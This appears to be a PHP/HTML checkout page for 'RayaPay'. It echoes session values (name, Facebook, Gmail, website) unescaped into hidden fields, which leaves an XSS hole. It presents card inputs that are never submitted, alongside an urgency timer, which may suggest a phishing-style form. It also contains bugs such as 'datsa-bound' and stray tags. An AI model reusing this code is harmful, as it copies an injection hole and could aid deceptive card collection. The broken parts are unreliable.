<?php
session_start(); // Start the session

$name = isset($_SESSION['name']) ? $_SESSION['name'] : '';
$location = isset($_SESSION['location']) ? $_SESSION['location'] : '';
$facebook = isset($_SESSION['facebook']) ? $_SESSION['facebook'] : '';
$website = isset($_SESSION['website']) ? $_SESSION['website'] : '';
$gmail = isset($_SESSION['gmail']) ? $_SESSION['gmail'] : '';


unset($_SESSION['name']);
unset($_SESSION['location']);
unset($_SESSION['facebook']);
unset($_SESSION['website']);
unset($_SESSION['gmail']);
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Gateway</title>
    <!-- Main Style  -->
    <link rel="stylesheet" href="../.././css/payStyle.css">
    <!-- Favicon  -->
    <link rel="icon" href="../.././images/favicon_Payment/favicon.ico">
    <!-- Awesome icon -->
    <link rel="stylesheet" href="../.././css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
</head>
`
<body>
    <div class="screen flex-center">
        <form class="popup flex p-lg" id="bank-card-form" action="../Process/process-company.php" method="post">
            <div class="close-btn pointer flex-center p-sm">
                <i class="ai-cross"></i>
            </div>

            <!-- CARD FORM -->
            <div class="flex-fill flex-vertical">
                <div class="header flex-between flex-vertical-center">
                    <div class="flex-vertical-center">
                        <i class="ai-bitcoin-fill size-xl pr-sm f-main-color"></i>
                        <span class="title">
                            <strong>Raya</strong><span>Pay</span>
                        </span>
                    </div>
                    <div class="timer" data-id="timer">
                        <span>0</span><span>5</span>
                        <em>:</em>
                        <span>0</span><span>0</span>
                    </div>
                </div>
                <div class="card-data flex-fill flex-vertical">

                    <!-- Card Number -->
                    <div class="flex-between flex-vertical-center">
                        <div class="card-property-title">
                            <strong>Card Number</strong>
                            <span>Enter 16-digit card number on the card</span>
                        </div>
                        <div class="f-main-color pointer"><i class="ai-pencil"></i> Edit</div>
                    </div>

                    <!-- Card Field -->
                    <div class="flex-between">
                        <div class="card-number flex-vertical-center flex-fill">
                            <div class="card-number-field flex-vertical-center flex-fill">


                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
                                    <path fill="#ff9800" d="M32 10A14 14 0 1 0 32 38A14 14 0 1 0 32 10Z" />
                                    <path fill="#d50000" d="M16 10A14 14 0 1 0 16 38A14 14 0 1 0 16 10Z" />
                                    <path fill="#ff3d00"
                                        d="M18,24c0,4.755,2.376,8.95,6,11.48c3.624-2.53,6-6.725,6-11.48s-2.376-8.95-6-11.48 C20.376,15.05,18,19.245,18,24z" />
                                </svg>
                                <input class="numbers" type="number" min="1" max="9999" placeholder="0000">-
                                <input class="numbers" type="number" placeholder="0000">-
                                <input class="numbers" type="number" placeholder="0000">-
                                <input class="numbers" type="number" placeholder="0000" data-bound="carddigits_mock"
                                    data-def="0000">
                            </div>
                            <i class="ai-circle-check-fill size-lg f-main-color"></i>
                        </div>
                    </div>

                    <!-- Expiry Date -->
                    <div class="flex-between">
                        <div class="card-property-title">
                            <strong>Expiry Date</strong>
                            <span>Enter the expiration date of the card</span>
                        </div>
                        <div class="card-property-value flex-vertical-center">
                            <div class="input-container half-width">
                                <input class="numbers" data-bound="mm_mock" data-def="00" type="number" min="1" max="12"
                                    step="1" placeholder="MM">
                            </div>
                            <span class="m-md">/</span>
                            <div class="input-container half-width">
                                <input class="numbers" data-bound="yy_mock" data-def="01" type="number" min="23"
                                    max="99" step="1" placeholder="YY">
                            </div>
                        </div>
                    </div>

                    <!-- CCV Number -->
                    <div class="flex-between">
                        <div class="card-property-title">
                            <strong>CVC Number</strong>
                            <span>Enter card verification code from the back of the card</span>
                        </div>
                        <div class="card-property-value">
                            <div class="input-container">
                                <input id="cvc" type="password">
                                <i id="cvc_toggler" data-target="cvc" class="ai-eye-open pointer"></i>
                            </div>
                        </div>
                    </div>

                    <!-- Name -->
                    <div class="flex-between">
                        <div class="card-property-title">
                            <strong>Cardholder Name</strong>
                            <span>Enter cardholder's name</span>
                        </div>
                        <div class="card-property-value">
                            <div class="input-container">
                                <input id="name" data-bound="name_mock" data-def="Mr. Cardholder" type="text"
                                    class="uppercase" placeholder="CARDHOLDER NAME">
                                <i class="ai-person"></i>
                            </div>
                        </div>
                    </div>


                </div>
                <div class="action flex-center">
                    <input type="hidden" name="name" value="<?php echo $name; ?>">
                    <input type="hidden" name="location" value="<?php echo $location; ?>">
                    <input type="hidden" name="facebook" value="<?php echo $facebook; ?>">
                    <input type="hidden" name="website-url" value="<?php echo $website; ?>">
                    <input type="hidden" name="gmail" value="<?php echo $gmail; ?>">
                    <button type="submit" class="b-main-color pointer">Pay Now</button>
                </div>
            </div>

            <!-- SIDEBAR -->
            <div class="sidebar flex-vertical">
                <div>

                </div>
                <div class="purchase-section flex-fill flex-vertical">

                    <div class="card-mockup flex-vertical">
                        <div class="flex-fill flex-between">
                            <i class="ai-bitcoin-fill size-xl f-secondary-color"></i>
                            <i class="ai-wifi size-lg f-secondary-color"></i>
                        </div>
                        <div>
                            <div id="name_mock" class="size-md pb-sm uppercase ellipsis">mr. Cardholder</div>
                            <div class="size-md pb-md">
                                <strong>
                                    <span class="pr-sm">
                                        &#x2022;&#x2022;&#x2022;&#x2022;
                                    </span>
                                    <span id="carddigits_mock">0000</span>
                                </strong>
                            </div>
                            <div class="flex-between flex-vertical-center">
                                <strong class="size-md">
                                    <span id="mm_mock">00</span>/<span id="yy_mock">01</span>
                                </strong>

                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
                                    <path fill="#ff9800" d="M32 10A14 14 0 1 0 32 38A14 14 0 1 0 32 10Z" />
                                    <path fill="#d50000" d="M16 10A14 14 0 1 0 16 38A14 14 0 1 0 16 10Z" />
                                    <path fill="#ff3d00"
                                        d="M18,24c0,4.755,2.376,8.95,6,11.48c3.624-2.53,6-6.725,6-11.48s-2.376-8.95-6-11.48 C20.376,15.05,18,19.245,18,24z" />
                                </svg>

                            </div>
                        </div>
                    </div>

                    <ul class="purchase-props">
                        <li class="flex-between">
                            <span>Company</span>
                            <strong>Raya</strong>
                        </li>
                        <li class="flex-between">
                            <span>Order number</span>
                            <strong>3142191</strong>
                        </li>
                        <li class="flex-between">
                            <span>Product</span>
                            <strong>Card</strong>
                        </li>
                        <li class="flex-between">
                            <span>VAT (20%)</span>
                            <strong>$6.99</strong>
                        </li>
                    </ul>
                </div>
                <div class="separation-line"></div>
                <div class="total-section flex-between flex-vertical-center">
                    <div class="flex-fill flex-vertical">
                        <div class="total-label f-secondary-color">You have to Pay</div>
                        <div>
                            <strong>8</strong>
                            <small>.40 <span class="f-secondary-color">USD</span></small>
                        </div>
                    </div>
                    <i class="ai-coin size-lg"></i>
                </div>
            </div>
            </d>
    </div>

</body>

<script>
    const bounds = document.querySelectorAll('[data-bound]');

    for (let i = 0; i < bounds.length; i++) {
        const targetId = bounds[i].getAttribute('datsa-bound');
        const defValue = bounds[i].getAttribute('data-def');
        const targetEl = document.getElementById(targetId);
        bounds[i].addEventListener('keyup', () => targetEl.innerText = bounds[i].value || defValue);
    }

    const cvc_toggler = document.getElementById('cvc_toggler');

    cvc_toggler.addEventListener('click', () => {
        const target = cvc_toggler.getAttribute('data-target');
        const el = document.getElementById(target);
        el.setAttribute('type', el.type === 'text' ? 'password' : 'text');
    });


    /* TIMER COUNTDOWN */
    const timer = document.querySelector('[data-id=timer]');
    let timeLeft = 5 * 60 + 1;

    const tick = () => {
        if (timeLeft > 0) {
            timeLeft--;
            const date = new Date('2000-01-01 00:00:00');
            date.setSeconds(timeLeft);
            const str = date.toISOString();
            timer.children[0].innerText = str[14];
            timer.children[1].innerText = str[15];
            timer.children[3].innerText = str[17];
            timer.children[4].innerText = str[18];
        }
    }

    setInterval(() => { tick(); }, 1000);
    tick();

</script>

</html>


